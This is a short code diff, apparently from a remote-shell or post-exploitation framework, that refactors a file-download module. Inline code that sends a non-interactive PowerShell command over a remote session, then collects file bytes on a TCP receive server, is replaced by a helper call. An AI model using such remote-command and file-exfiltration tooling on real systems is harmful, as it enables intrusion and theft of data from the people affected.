@@ -2,9 +2,7 @@ from __future__ import annotations
 import ntpath
 import os
 import posixpath
-import select
 import shlex
-import time
 import uuid
 from koi.modules.blueprint import KoiModule, TCPReceiveServer
 
@@ -97,17 +95,7 @@ class DownloadModule(KoiModule):
                 f"$_f.Close();$_s.Flush();$_c.Close()"
             )
 
-            if self.session.upgraded:
-                self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
-                time.sleep(0.3)
-                r, _, _ = select.select([self.session.conn], [], [], 1.0)
-                if r:
-                    self.session.conn.recv(4096)
-            elif os_type == "windows_ps":
-                self.sendline(ps_cmd)
-            else:
-                escaped = ps_cmd.replace('"', '\\"')
-                self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')
+            self._dispatch_ps(ps_cmd)
 
         try:
             raw = srv.collect()
